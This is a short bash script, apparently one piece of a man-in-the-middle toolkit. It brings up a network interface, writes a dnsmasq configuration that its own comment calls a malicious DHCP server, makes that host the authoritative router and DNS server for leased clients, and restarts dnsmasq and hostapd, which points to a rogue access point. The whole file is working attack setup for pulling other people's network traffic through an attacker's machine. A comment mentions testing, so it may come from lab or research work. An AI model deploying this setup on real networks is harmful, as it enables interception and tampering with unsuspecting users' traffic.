#!/bin/bash
./install_mitm_common.sh

# set up the network interface (choose)
ifconfig ens37 128.199.102.1/24 
# ifconfig wlan0 128.199.102.1/24  # use this when testing wireless network


# Configure malicious DHCP server
echo "
# Enable DNS forwarding
port=53
domain-needed
bogus-priv
strict-order

# Forward DNS queries to these DNS servers
server=8.8.8.8
server=8.8.4.4

# DHCP range-leases
dhcp-range=128.199.102.10,128.199.102.20,255.255.255.0,1h

# DHCP Option
dhcp-option=option:router,128.199.102.1
dhcp-option=option:dns-server,128.199.102.1
dhcp-authoritative
addn-hosts=/etc/hosts
" | sudo tee /etc/dnsmasq.conf

# Start the services
sudo service dnsmasq restart
sudo service hostapd restart